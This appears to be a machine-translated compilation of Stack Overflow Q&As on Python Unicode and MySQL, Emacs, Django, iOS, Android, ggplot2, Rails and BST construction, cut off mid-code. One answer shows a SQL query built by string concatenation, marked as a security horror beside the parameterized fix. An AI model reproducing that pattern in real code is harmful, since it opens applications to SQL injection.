当我尝试将其存储到数据库中时，它会显示：

> ProgrammingError: (1064, "您的 SQL 语法有错误；请查看与您的 MySQL 服务器版本相对应的手册，以了解在 '\xd8\xa7\xd9\x84\xd9\x82\xd8\xb5\ 附近使用的正确语法xd9\x8a\xd8\xb1)' 在第 1 行")

我的想法是获取它然后将其编码为base64，然后将其存储到db中，但仍然出现错误：

> UnicodeEncodeError：“ascii”编解码器无法对位置 0-3 中的字符进行编码：序数不在范围内（128）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-02T14:52:07.350

> 我能做的唯一方法是使用 . 指定它们有多少个字母。并使用 unicode，像这样

好的……有问题吗？除了使用正则表达式从 HTML 中破解字符串的一般不可靠性之外，显然 - 考虑使用适当的解析器（例如 lxml.html 等）。

> 当我尝试将其写入文本文件时，它显示：UnicodeEncodeError

文件是字节，因此要写入文本文件，您必须将字符编码回字节。例如

```
with open('file.txt', 'w') as fp:
    fp.write(content.encode('utf-8')) 
```

如果你尝试直接写字符，Python 会猜测一个编码，通常是 ASCII，然后会像上面一样失败，因为阿拉伯语不能用 ASCII 表示。

> 当我尝试将其存储到数据库中时，它会显示： ProgrammingError: (1064, “您的 SQL 语法有错误；请查看与您的 MySQL 服务器版本相对应的手册，以了解在 '\xd8\ 附近使用的正确语法xa7\xd9\x84\xd9\x82\xd8\xb5\xd9\x8a\xd8\xb1)'

邮政编码？我不认为这是一个 Unicode 问题。它看起来更像是您正在创建一个包含其中内容的查询，而没有用引号括住该内容。不要那样做 - 使用参数化查询。

```
c.execute('INSERT INTO something VALUES ('+content+')')     # fails, and security horror
c.execute('INSERT INTO something VALUES (%s)', (content,))  # fine 
```

> 我考虑的是获取它然后将其编码为base64

同样，base64 对字节而不是字符进行操作，因此首先进行编码。

```
content.encode('utf-8').encode('base64') 
```

但您不必编码为 base64 以将 Unicode 字符存储在数据库中。确保您使用的是带有 UTF-8 排序规则的表列，并使用 UTF-8 作为连接字符集，并且不需要额外的处理。

# ruby - Tab 键在 Emacs ruby 模式下不起作用

> ID：13167506
> 
> 赞同：2
> 
> 时间：2012-10-31T21:12:11.073
> 
> 标签：ruby, emacs, emacs24

在 Debian 上运行 Emacs 24.2.50.1 时遇到问题。在 ruby​​ 模式下，每当我按 Tab 键编辑缩进时，我都会收到错误消息：“Wrong-type-argument: number-or-marker-p, nil”

进一步检查揭示了这个错误：

```
Debugger entered--Lisp error: (wrong-type-argument number-or-marker-p nil)
ruby-calculate-indent()
ruby-indent-line()
indent-for-tab-command(nil)
call-interactively(indent-for-tab-command nil nil) 
```

请注意，tab 键在 ruby​​ 模式之外可以正常工作（在 python 模式下工作正常等），所以我认为它必须是 ruby​​ 模式中用于缩进的错误，但在诊断和修复此问题方面的任何帮助将是赞赏。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-05T02:14:58.813

我对 Emacs 24.2 也有同样的问题。`ruby-indent-level`被设置为 0 `python-mode`。

我在 python-model.el 中进行了以下更改：

```
(defvar ruby-indent-level nil)
(defvar nxml-child-indent nil) 
```

至

```
(defvar ruby-indent-level 2)
(defvar nxml-child-indent 2) 
```

然后`M-x byte-compile-file`。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-29T14:50:01.573

[我遇到了类似的问题，并用Enhanced Ruby Mode](https://github.com/zenspider/enhanced-ruby-mode)替换了 built-in ruby ​​-mode 。如果您使用的是 Ruby 1.9.2 或更高版本，您可以尝试一下。

# python - python：简单的子字符串/解析

> ID：13167508
> 
> 赞同：0
> 
> 时间：2012-10-31T21:12:30.070
> 
> 标签：python, string, parsing, substring

我有这样的字符串

```
 <img src="http://www.askgamblers.com/cache/97299a130feb2e59a08a08817daf2c0e6825991f_begado-casino-logo-review1.jpg" /><br/>
 Begado is the newest online casino in our listings. As the newest
 member of the Affactive group, Begado features NuWorks slots and games
 for both US and international players.
<img src="http://feeds.feedburner.com/~r/AskgamblesCasinoNews/~4/SXhvCskjiYo" height="1" width="1"/> 
```

我需要`src`从第一个`img`标签中获取

我可以轻松做到吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-31T21:21:15.683

对于 Python 中的 HTML 屏幕抓取，我推荐[Beautiful Soup](http://www.crummy.com/software/BeautifulSoup/)库。

```
from bs4 import BeautifulSoup
soup = BeautifulSoup(html_doc)
images = list(soup.findAll('img'))
print images[0]['src'] 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-31T21:17:09.070

强制性“不要使用正则表达式解析 HTML”警告：[https ://stackoverflow.com/a/1732454/505154](https://stackoverflow.com/a/1732454/505154)

邪恶的正则表达式解决方案：

```
import re
re.findall(r'<img\s*src="([^"]*)"\s*/>', text) 
```

这将返回一个列表，其中包含`src`每个*仅*包含一个属性的`<img>`标签的属性（因为您说您只想匹配第一个）。*`src`*

 ** * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-31T21:16:54.207

一种方法是使用[regex](http://docs.python.org/2/library/re.html)。

另一种方法是用引号[分割](http://docs.python.org/2/library/stdtypes.html#str.split)字符串，然后获取返回的第二个元素。

```
splits = your_string.split('"')
print splits[1] 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-31T21:34:05.490

这是一种快速而丑陋的方法，无需任何库：

```
"""
    >>> get_src(data)
    ['http://www.askgamblers.com/cache/97299a130feb2e59a08a08817daf2c0e6825991f_begado-casino-logo-review1.jpg', 'http://feeds.feedburner.com/~r/AskgamblesCasinoNews/~4/SXhvCskjiYo']
"""

data = """<img src="http://www.askgamblers.com/cache/97299a130feb2e59a08a08817daf2c0e6825991f_begado-casino-logo-review1.jpg" /><br/>
 Begado is the newest online casino in our listings. As the newest
 member of the Affactive group, Begado features NuWorks slots and games
 for both US and international players.
<img src="http://feeds.feedburner.com/~r/AskgamblesCasinoNews/~4/SXhvCskjiYo" height="1" width="1"/>"""

def get_src(lines):
    srcs = []
    for line in data.splitlines():
        i = line.find('src=') + 5
        f = line.find('"', i)
        if i > 0 and f > 0:
            srcs.append(line[i:f])
    return srcs 
```

但是我会推荐使用[Beatiful Soup](http://www.crummy.com/software/BeautifulSoup/)，它是一个非常好的库，旨在处理真实的网络（损坏的 HTML 和所有），或者如果您的数据是有效的 XML，您可以使用Python 标准库中的[Element Tree](http://docs.python.org/2/library/xml.etree.elementtree.html)。*

# django - 在 Django 模板中声明数组字面量

> ID：13167510
> 
> 赞同：1
> 
> 时间：2012-10-31T21:12:37.433
> 
> 标签：django, django-templates

在 django 模板中，我有一个`<select>`类似于以下内容的元素：

```
<option value="0">0</option>
<option value="10">10</option>
<option value="15">20</option>
<option value="30">30</option>
<option value="45">45</option>
<option value="60">60</option> 
```

列出这个大混乱是相当丑陋和多余的，我想做类似的事情：

```
{% for i in list(0, 10, 20, 30, 45, 60) %}
<option value="{{i}}">{{i}}</option>
{% for %} 
```

我想我可以将这些变量放在上下文变量中，但我不想在这里涉及视图，它似乎应该保留在模板级别。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-31T22:21:33.533

这与您应该在模板中执行的操作完全相反。您的表单应该在视图级别组装并通过上下文传递给模板。模板应该最小化逻辑并简单地显示您视图中的内容。如果您使用 django 的 Form 和 ModelForm 类，您可以让 django 为您完成所有工作

# iphone - 在 Storyboard 中隐藏一个 ViewController 的 NavigationBar

> ID：13167520
> 
> 赞同：13
> 
> 时间：2012-10-31T21:13:57.670
> 
> 标签：iphone, ios, xcode, uinavigationcontroller, navbar

我找到了很多帖子，但仍然没有解决方案。我试图在最初隐藏一个 NavigationBar `UIViewController`，但我仍想在第二个显示它`UIViewController`。这是我的故事板：

![在此处输入图像描述](../Images/98d76cbe31a35423e29ed90a331fd0e3.png)

当我关闭主视图控制器的推断顶部栏时，它会在 Storyboard 中消失，但在我运行应用程序时仍会显示。当我对 NavController 中的 NavigationBar 执行相同操作时，它对所有三个都消失了（因为它们都继承了 no Nav Bar）。

我想在 ScrollViewV 视图控制器中显示 NavBar，但将其隐藏在`MainViewController`.

所有控制器都有相应的 .h 或 .m 文件，但我对如何以编程方式执行此操作感到困惑。如果您需要查看其他内容，请告诉我。非常感谢！

* * *

## 回答 #1

> 赞同：43
> 
> 时间：2012-10-31T21:17:33.033

在您的 mainViewController 中，您可以执行以下操作：

```
- (void)viewWillAppear:(BOOL)animated
{
    [self.navigationController setNavigationBarHidden:YES animated:animated];
    [super viewWillAppear:animated];
} 
```

* * *

您可能希望在隐藏此 ViewController 时显示导航栏，为此执行以下操作：

```
- (void)viewDidDisappear: (BOOL)animated
{
    [self.navigationController setNavigationBarHidden:NO animated:animated];
    [super viewDidDisappear:animated];
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2014-08-15T00:26:05.737

如果您想将内容保留在 Storyboard 中，而不是编辑用户定义的属性并将其设置`navigationController.navigationBarHidden`为选中的布尔值。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-09-03T13:36:24.930

我注意到您还需要将以下内容添加到您希望导航出现的控制器中。

```
[self.navigationController setNavigationBarHidden:NO animated:animated];
[super viewWillAppear:animated]; 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-31T21:20:01.290

```
self.navigationController.navigationBarHidden = YES; 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2016-08-30T07:38:36.297

有人想知道如何在 Swift 中做到这一点吗？

```
override func viewDidAppear(animated: Bool) {
    super.viewDidAppear(animated)
    self.navigationController?.navigationBar.hidden = true
} 
```

# android - Android - 自定义样式中指定的边距未生效

> ID：13167529
> 
> 赞同：28
> 
> 时间：2012-10-31T21:14:40.277
> 
> 标签：android, styles, themes

我希望 EditText 的默认边距为 10dp。因此，在我的 styles.xml 文件中，我设置了以下内容：

```
<resources xmlns:android="http://schemas.android.com/apk/res/android">

    <style name="MyTheme" parent="android:style/Theme.NoTitleBar">
        <item name="android:editTextStyle">@style/edit_text_default</item>
    </style>

    <style name="edit_text_default" parent="android:style/Widget.EditText">
        <item name="android:layout_margin">10dp</item>
    </style>

</resources> 
```

然后在 AndroidManifest.xml 中，我将应用程序主题设置为我定义的主题：

```
<application
     android:icon="@drawable/ic_launcher"
     android:label="@string/app_name"
     android:theme="@style/MyTheme" >
... 
```

主题的“无标题栏”方面正在发挥作用。但是，EditText 的默认边距不是，它仍在填充父级。这是我的表格视图：

```
<TableLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    android:background="#FFFFFF" >
    <TableRow>
        <EditText android:hint="@string/last_name" />
    </TableRow>
    <TableRow>
        <EditText android:hint="@string/first_name" />
    </TableRow>
</TableLayout> 
```

* * *

## 回答 #1

> 赞同：57
> 
> 时间：2012-11-13T17:07:11.793

**简短回答：**如果您在自定义样式中指定 layout_margin，则必须将此样式显式应用于您希望具有指定边距的每个单独的视图（如下面的代码示例所示）。在主题中包含此样式并将其应用于您的应用程序或活动将不起作用。

```
<TableLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    android:background="#FFFFFF" >
    <TableRow>
        <EditText android:hint="@string/last_name" style="@style/edit_text_default" />
    </TableRow>
    <TableRow>
        <EditText android:hint="@string/first_name" style="@style/edit_text_default" />
    </TableRow>
</TableLayout> 
```

**说明：**`layout_`以[LayoutParams](http://developer.android.com/reference/android/view/ViewGroup.LayoutParams.html)或其子类之一开头的属性（例如[MarginLayoutParams](http://developer.android.com/reference/android/view/ViewGroup.MarginLayoutParams.html)）。`LayoutParams`被视图用来告诉他们的父[ViewGroup](http://developer.android.com/reference/android/view/ViewGroup.html)他们想要如何布局。每个`ViewGroup`类都实现了一个可扩展的嵌套类`ViewGroup.LayoutParams`。因此，`LayoutParams`都是特定于`ViewGroup`'s 的类型。这意味着虽然 a`TableLayout`和 a`LinearLayout`可能都具有`layout_margin`it's 之一`LayoutParams`，但它们被认为是完全不同的属性。

因此`layout_margin`，不仅仅是可以在任何地方应用的通用属性。它必须在`ViewGroup`明确将其定义为有效参数的 a 的上下文中应用。应用视图时必须*知道*其父视图的类型。`ViewGroup``LayoutParams`

在样式中指定 layout_margin，包括主题中的样式，并尝试将该主题应用于应用程序/活动将导致布局属性被删除，因为尚未指定 ViewGroup 父级，因此参数无效。但是，将样式应用于`EditText`已使用 a 定义的视图是`TableLayout`有效的，因为父级`ViewGroup`(the `TableLayout`) 是已知的。

**资料来源：**

[布局参数](http://developer.android.com/guide/topics/ui/declaring-layout.html#layout-params)的Android 文档。

Android 框架工程师和 StackOverflow 用户[adamp](https://stackoverflow.com/users/342605/adamp)[对此问题](https://stackoverflow.com/questions/5315529/layout-problem-with-button-margin)的回答。

另外，StackOverflow 用户[inazaruk](https://stackoverflow.com/users/69802/inazaruk)[对此问题](https://stackoverflow.com/questions/6453877/setting-layout-parameters-in-android)的回答。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-31T21:19:30.993

您没有在清单中使用正确的主题名称。尝试将其更改为：

```
<application
     android:icon="@drawable/ic_launcher"
     android:label="@string/app_name"
     android:theme="@style/MyTheme" > 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2018-02-27T17:19:55.650

以防万一它对其他人有用，我想在这里将[Oliv 的答案带到另一个 SO 问题](https://stackoverflow.com/a/34225206/355456)。我试图为所有按钮添加边距，发现 layout_margin 不起作用。

主题：

```
<style name="FooThemeStyle" parent="Base.Theme.AppCompat">
    <item name="android:buttonStyle">@style/FooButton</item>
    <item name="buttonStyle">@style/FooButton</item>
</style> 
```

按钮样式：

```
<style name="FooButton" parent="Widget.AppCompat.Button">
    <item name="android:background">@drawable/button_background</item>
</style> 
```

这是 button_background.xml，其中[Oliv 对另一个 SO 问题的回答](https://stackoverflow.com/a/34225206/355456)用于将边距设置为 2dp: ：

```
<?xml version="1.0" encoding="utf-8"?>
<layer-list xmlns:android="http://schemas.android.com/apk/res/android">
    <item
        android:bottom="2dp"
        android:left="2dp"
        android:right="2dp"
        android:top="2dp">
        <selector xmlns:android="http://schemas.android.com/apk/res/android">
          ...
        </selector>
    </item>
</layer-list> 
```

# r - ggplot2 多个 stat_binhex() 在一张图像中绘制不同颜色梯度的图

> ID：13167531
> 
> 赞同：12
> 
> 时间：2012-10-31T21:14:41.433
> 
> 标签：r, ggplot2, data-visualization, hexagonal-tiles

我想使用 ggplot2 的 stat_binhex() 在同一个图表上同时绘制两个自变量，每个变量都有自己的颜色渐变，使用 scale_colour_gradientn()。

如果我们忽略 x 轴单位不匹配的事实，一个可重现的示例是在同一图像中绘制以下内容，同时保持单独的填充渐变。

```
d <- ggplot(diamonds, aes(x=carat,y=price))+
  stat_binhex(colour="white",na.rm=TRUE)+
  scale_fill_gradientn(colours=c("white","blue"),name = "Frequency",na.value=NA)
try(ggsave(plot=d,filename=<some file>,height=6,width=8)) 
```

![在此处输入图像描述](../Images/1feef43e91124d577c45da3499dfdbf6.png)

```
d <- ggplot(diamonds, aes(x=depth,y=price))+
  stat_binhex(colour="white",na.rm=TRUE)+
  scale_fill_gradientn(colours=c("yellow","black"),name = "Frequency",na.value=NA)
try(ggsave(plot=d,filename=<some other file>,height=6,width=8)) 
```

![在此处输入图像描述](../Images/c0b853a5beba4682d631dab2c1e21508.png)

[我在 ggplot2 google groups here](https://github.com/hadley/ggplot2/issues/578)中找到了一些相关问题的对话。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-11-01T01:41:54.730

这是另一种可能的解决方案：我采用了@mnel 将 bin 计数映射到 alpha 透明度的想法，并且我已经转换了 x 变量，以便它们可以绘制在相同的轴上。

```
library(ggplot2)

# Transforms range of data to 0, 1\. 
rangeTransform = function(x) (x - min(x)) / (max(x) - min(x))

dat = diamonds
dat$norm_carat = rangeTransform(dat$carat)
dat$norm_depth = rangeTransform(dat$depth)

p1 = ggplot(data=dat) +
     theme_bw() +
     stat_binhex(aes(x=norm_carat, y=price, alpha=..count..), fill="#002BFF") +
     stat_binhex(aes(x=norm_depth, y=price, alpha=..count..), fill="#FFD500") +
     guides(fill=FALSE, alpha=FALSE) +
     xlab("Range Transformed Units")

ggsave(plot=p1, filename="plot_1.png", height=5, width=5) 
```

*想法：*

1.  我尝试（但失败了）显示一个合理的颜色/alpha 图例。看起来很棘手，但考虑到 ggplot2 的所有图例自定义功能，应该是可能的。

2.  X 轴单元标记需要某种解决方案。许多人不赞成在一个轴上绘制两组单位，而 ggplot2 没有这样的功能。

3.  在这个例子中，颜色重叠的单元格的解释似乎很清楚，但根据使用的数据集和选择的颜色，可能会变得非常混乱。

4.  如果这两种颜色是相加补色，那么无论它们在哪里重叠，您都会看到中性灰色。在重叠不相等的地方，灰色会变成更黄或更蓝。从灰色重叠单元格的略带粉红色的色调来看，我的颜色不是很互补。

![在此处输入图像描述](../Images/8e08b6ec8759fa3db0343caa7b6f7052.png)

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-10-31T22:38:19.863

我认为您想要的内容`ggplot2`更普遍地违反了图形方法的原则和语法。在[问题](https://github.com/hadley/ggplot2/issues/578)得到解决之前（我不会屏住呼吸），你有几个选择

# 使用`facet_wrap`和`alpha`

这不会产生一个*好的*传说，但会带你去你想要的东西。

您可以将`alpha`值设置为按计算进行缩放`Frequency`，访问方式为`..Frequency..`

我不认为你可以很好地合并传说。

```
library(reshape2)
# in long format
dm <- melt(diamonds, measure.var = c('depth','carat'))

ggplot(dm, aes(y = price, fill = variable, x = value)) + 
   facet_wrap(~variable, ncol = 1, scales  = 'free_x') + 
   stat_binhex(aes(alpha = ..count..), colour = 'grey80') + 
    scale_alpha(name = 'Frequency', range = c(0,1)) + 
    theme_bw() + 
    scale_fill_manual('Variable', values = setNames(c('darkblue','yellow4'), c('depth','carat'))) 
```

![在此处输入图像描述](../Images/8dffd181ae190d50d8ac780765631a27.png)

# `gridExtra`与`grid.arrange`或一起使用`arrangeGrob`

您可以创建单独的图并用于`gridExtra::grid.arrange`在单个图像上排列。

```
d_carat <- ggplot(diamonds, aes(x=carat,y=price))+
  stat_binhex(colour="white",na.rm=TRUE)+
  scale_fill_gradientn(colours=c("white","blue"),name = "Frequency",na.value=NA)

d_depth <- ggplot(diamonds, aes(x=depth,y=price))+
  stat_binhex(colour="white",na.rm=TRUE)+
  scale_fill_gradientn(colours=c("yellow","black"),name = "Frequency",na.value=NA)

library(gridExtra)

grid.arrange(d_carat, d_depth, ncol =1) 
```

![在此处输入图像描述](../Images/3229e9d6a66140763d7eba7aa5ccabb2.png)

如果您希望使用它`ggsave`（感谢下面的@bdemarest 评论和@baptiste）

`grid.arrange`用类似的`arrangeGrob`东西代替。

```
ggsave(plot=arrangeGrob(d_carat, d_depth, ncol=1), filename="plot_2.pdf", height=12, width=8) 
```

# javascript - 覆盖注册页面

> ID：13167532
> 
> 赞同：1
> 
> 时间：2012-10-31T21:14:41.883
> 
> 标签：javascript, drupal, drupal-7, user-registration

我正在使用 drupal v7，我想覆盖注册表单。

自定义表单将是一个客户端 3 步注册，使用 jQueryUI.accordion。

使用新模块的解决方案：

```
reg.module: [X_form_user_login_alter(); X_form_user_login_block_alter();]

reg.tpl.php: [Html/JavaScript/CSS]

template.php: [X_preprocess_user_register() { $variables['rendered'] = drupal_render($variables['form']); }] 
```

解决方案显示得很好，页面中的所有资源都可用。

问题是，html(reg.tpl.php) 表单中的任何按钮都没有调用 jQuery click 事件，而是预先提交到服务器。

如何防止提交？

有没有办法在drupal中使用客户端代码？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-03T06:17:56.177

请检查页面中包含的脚本。

在 jQuery 中，您可以使用：

```
event.preventDefault(); 
```

防止表单提交。

# java - 给定这个标准，如何找到所有可能的组合？

> ID：13167533
> 
> 赞同：5
> 
> 时间：2012-10-31T21:14:46.620
> 
> 标签：java, recursion, combinations

我有一个`Card`实例数组。

```
Card[] allCards; 
```

在以下条件下，我应该获得这些卡的所有可能组合：

*   所有组合必须至少有 3 张牌。
*   组合没有牌限制（所以如果总共有 15 张牌，你知道可以有 15 张牌的组合，其他 13、10 等）。

出于大学目的，我不应该使用任何能够更轻松地完成这项工作的精美库。

当然，我已经配对完成了，但考虑到没有限制，我通常会使用的算法不起作用。

这几乎就是他们对 python 的要求：[查找所有可能的组合](https://stackoverflow.com/questions/6312396/find-all-possible-combinations)

有任何想法吗？我不想要代码或任何东西——我只是迷失了算法/想法。

**我的问题（更详细）**

我可以通过制作两个循环（一个在另一个循环中）来配对。我可以通过三个循环（一个在另一个循环中）来制作三胞胎。

但我不知道如何解决这个特定问题，因为：

*   如果阵列有 15 张卡怎么办？我不能写15个循环......
*   然后当然我需要下降到 14、13、12 个循环......（因为所有组合都不是每个 15 个元素，所以在使用这 15 个元素时可以有 14、13、12 个元素的组合-大批）

我可以找到一些组合，但不是动态的。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-31T21:45:09.417

**纸笔练习：**

让我们暂时离开 Java 语法。以 5 张牌为例，比如 Ace 到 10 的方块。现在列出所有可能的配对。（提示：有 10 个）

现在使用你的配对列表，列出每一个可能的三元组。

现在使用三元组列表，列出 4 的所有可能组合。

**现在让我们编写代码：**

由于您在编译时不知道组合的最大长度，因此使用循环不会解决问题。另一方面，这个问题适合递归。让我们首先假设我们有一个`Card[][] getCombinations(Card[] cards)`返回卡片数组数组的函数。所以如果我们打电话

```
Card[] cards = new Card[15];
// initialize individual Card objects
Card[][] combinations = getCombinations(cards); 
```

`combinations[i]`包含生成的组合之一。

现在，为了简单起见，假设`getCombinations()`只返回对。你如何使用这些对来创建所有可能的三元组？

# c# - 使用 C# 示例使用 Coldfusion 通过 REST 访问 Azure Blob 存储

> ID：13167534
> 
> 赞同：2
> 
> 时间：2012-10-31T21:14:48.703
> 
> 标签：c#, azure-storage, coldfusion-7

我在尝试锻炼如何列出所有容器和 blob 时遇到了困难。奇怪的是，我还没有看到一个这样做的 Coldfusion 示例。

我试过关注一个 C# 项目，但我被困在创建签名的地方。以下是到目前为止我从 C# 项目中提取的内容。

资源数组 - 这些是我想调用的一些资源

1.  restype=container&comp=list&include=snapshots&include=元数据
2.  比较=列表
3.  容器 + "/" + blob + "?comp=pagelist
4.  容器 + "/" + blob + "?comp=blocklist

我从 C# 逻辑中提取的内容

```
<cfhttp method="GET" url="http://#arguments.storageAccount#.#variables.hostEndPoint[storageType]#?#resource[1]#">
    <cfhttpparam type="header" name="x-ms-date" value="#dateTimeString#" />
    <cfhttpparam type="header" name="x-ms-version" value="2009-09-19" />
    <cfhttpparam type="header" name="Authorization" value="??????" />
</cfhttp> 
```

由于我不是 C# 开发人员，如果有人可以解释下面的结果是什么，我可以转换它。

MessageSignature 是否是以下值的逗号分隔列表（即 '{0}\n\n\n{1}\n{5}\n\n\n\n{2}\n\n\n\ n{3}{4},GET,,无论 ifMatch 返回什么，...')

```
MessageSignature = String.Format("{0}\n\n\n{1}\n{5}\n\n\n\n{2}\n\n\n\n{3}{4}",
    method,
    (method == "GET" || method == "HEAD") ? String.Empty : request.ContentLength.ToString(),
    ifMatch,
    GetCanonicalizedHeaders(request),
    GetCanonicalizedResource(request.RequestUri, StorageAccount),
    md5
); 
```

以下示例字符串将返回什么（例如“复杂 Azure！”）

```
 byte[] SignatureBytes = System.Text.Encoding.UTF8.GetBytes(MessageSignature); 
```

谢谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-06T23:16:04.847

我创建了一个视频，展示如何使用 C# 访问 Azure REST API，我相信该视频可以帮助您，Java 逻辑将非常相似。

[http://youtu.be/NJQzEnk2Gck?hd=1](http://youtu.be/NJQzEnk2Gck?hd=1)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-02T02:57:40.423

不久前，我尝试使用 Coldfusion 的 REST API，但没有取得多大成功，所以我无法直接回答您的问题（我也无法获得正确的签名）。然而，微软现在完全支持使用 REST API 的[Azure Java SDK](https://www.windowsazure.com/en-us/develop/java/)，这应该可以从 Coldfusion 中使用（尽管我还没有机会尝试它——尽管我完全打算这样做）。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2021-10-20T18:27:20.657

一段时间以来，我一直在追求同样的目标。

我刚刚更新到 CF 2021 以尝试解决所有这些问题。

有新的嵌入式功能可能会有所帮助：[https ://helpx.adobe.com/br/coldfusion/using/integrate-coldfusion-azure-blob.html](https://helpx.adobe.com/br/coldfusion/using/integrate-coldfusion-azure-blob.html)

# css - 如何在rails提交按钮中放置图标

> ID：13167535
> 
> 赞同：27
> 
> 时间：2012-10-31T21:14:57.513
> 
> 标签：css, ruby-on-rails-3, forms, twitter-bootstrap

我正在使用 Bootstrap 并希望在表单的提交按钮中放置一个图标。
这是代码：

```
<%= f.submit "Submit for Approval <i class='icon-share-alt icon-white'></i>", 
                                class: "button_green" %> 
```

生成的 HTML：

```
<input type="submit" value="Submit for Approval &lt;i class='icon-share-alt icon-white'&gt;&lt;/i&gt;" name="commit" class="button_green"> 
```

我尝试将 raw 和 html_safe 添加到文本中，但似乎都没有。
我知道一种解决方案是让类成为其中已经包含图标的图像，但我想这样做而不创建额外的图像/css。有什么建议么？

* * *

## 回答 #1

> 赞同：58
> 
> 时间：2012-10-31T21:50:53.553

您可以改用 button_tag 来做到这一点：

```
<%= button_tag( :class => "button_green") do %>
  Submit for Approval <i class="icon-share-alt icon-white"></i>
<% end %> 
```

这将创建一个`<button type="submit"></button>`包含图标和文字的元素。我已经测试过了，它可以工作。的默认操作`button_tag`是提交，因此如果您需要不同的操作（例如取消），您可以使用该`:type => "button"`选项来覆盖默认提交行为。

编辑：对于 Bootstrap 3，图标类名称已更改，因此您将

```
<span class="glyphicon-white glyphicon-share-alt white"></span> 
```

请注意，不再有白色图标的特殊类。只需创建一个 CSS 类`.white`并放入`color: #fff;`. 简单的。您可以使用您喜欢的任何颜色或文本样式，因为图标现在是一种字体。

相关问题：[在 Twitter Bootstrap 2 中将图标添加到提交按钮](https://stackoverflow.com/questions/9376192/add-icon-to-submit-button-in-twitter-bootstrap-2?rq=1)，以及[如何将 Bootstrap 3 的字形图标更改为白色？](https://stackoverflow.com/questions/18070322/how-do-i-change-bootstrap-3s-glyphicons-to-white)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-31T21:40:10.353

```
.button_green {
   background-image:url(...your image path...);
   background-repeat:no-repeat;
   padding-left:30px;
} 
```

您可能需要调整填充以匹配图标的大小。

# algorithm - 如何在给定后序遍历的情况下构造 BST

> ID：13167536
> 
> 赞同：13
> 
> 时间：2012-10-31T21:15:03.860
> 
> 标签：algorithm, recursion, binary-tree, binary-search-tree

我知道有一些方法可以从前序遍历（作为数组）构造一棵树。考虑到中序和前序遍历，更常见的问题是构造它。在这种情况下，虽然中序遍历是多余的，但它肯定会让事情变得更容易。谁能给我一个想法如何进行后序遍历？需要迭代和递归解决方案。

我尝试使用堆栈迭代地完成它，但根本无法正确逻辑，所以得到了一个可怕的混乱树。递归也是如此。

* * *

## 回答 #1

> 赞同：28
> 
> 时间：2012-10-31T22:08:43.983

如果你有一个来自 BST 的后序遍历的数组，你就知道根是数组的最后一个元素。根的左孩子占据了数组的第一部分，并且由小于根的条目组成。然后是右孩子，由大于根的元素组成。（两个孩子都可能是空的）。

```
________________________________
|             |              |R|
--------------------------------
 left child     right child   root 
```

所以主要的问题是找到左孩子结束和右孩子开始的点。

这两个孩子也是从他们的后序遍历中获得的，因此以相同的方式递归地构造它们。

```
BST fromPostOrder(value[] nodes) {
    // No nodes, no tree
    if (nodes == null) return null;
    return recursiveFromPostOrder(nodes, 0,  nodes.length - 1);
}

// Construct a BST from a segment of the nodes array
// That segment is assumed to be the post-order traversal of some subtree
private BST recursiveFromPostOrder(value[] nodes, 
                                   int leftIndex, int rightIndex) {
    // Empty segment -> empty tree
    if (rightIndex < leftIndex) return null;
    // single node -> single element tree
    if (rightIndex == leftIndex) return new BST(nodes[leftIndex]);

    // It's a post-order traversal, so the root of the tree 
    // is in the last position
    value rootval = nodes[rightIndex];

    // Construct the root node, the left and right subtrees are then 
    // constructed in recursive calls, after finding their extent
    BST root = new BST(rootval);

    // It's supposed to be the post-order traversal of a BST, so
    // * left child comes first
    // * all values in the left child are smaller than the root value
    // * all values in the right child are larger than the root value
    // Hence we find the last index in the range [leftIndex .. rightIndex-1]
    // that holds a value smaller than rootval
    int leftLast = findLastSmaller(nodes, leftIndex, rightIndex-1, rootval);

    // The left child occupies the segment [leftIndex .. leftLast]
    // (may be empty) and that segment is the post-order traversal of it
    root.left = recursiveFromPostOrder(nodes, leftIndex, leftLast);

    // The right child occupies the segment [leftLast+1 .. rightIndex-1]
    // (may be empty) and that segment is the post-order traversal of it
    root.right = recursiveFromPostOrder(nodes, leftLast + 1, rightIndex-1);

    // Both children constructed and linked to the root, done.
    return root;
}

// find the last index of a value smaller than cut in a segment of the array
// using binary search
// supposes that the segment contains the concatenation of the post-order
// traversals of the left and right subtrees of a node with value cut,
// in particular, that the first (possibly empty) part of the segment contains
// only values < cut, and the second (possibly empty) part only values > cut
private int findLastSmaller(value[] nodes, int first, int last, value cut) {

    // If the segment is empty, or the first value is larger than cut,
    // by the assumptions, there is no value smaller than cut in the segment,
    // return the position one before the start of the segment
    if (last < first || nodes[first] > cut) return first - 1;

    int low = first, high = last, mid;

    // binary search for the last index of a value < cut
    // invariants: nodes[low] < cut 
    //             (since cut is the root value and a BST has no dupes)
    // and nodes[high] > cut, or (nodes[high] < cut < nodes[high+1]), or
    // nodes[high] < cut and high == last, the latter two cases mean that
    // high is the last index in the segment holding a value < cut
    while (low < high && nodes[high] > cut) {

        // check the middle of the segment
        // In the case high == low+1 and nodes[low] < cut < nodes[high]
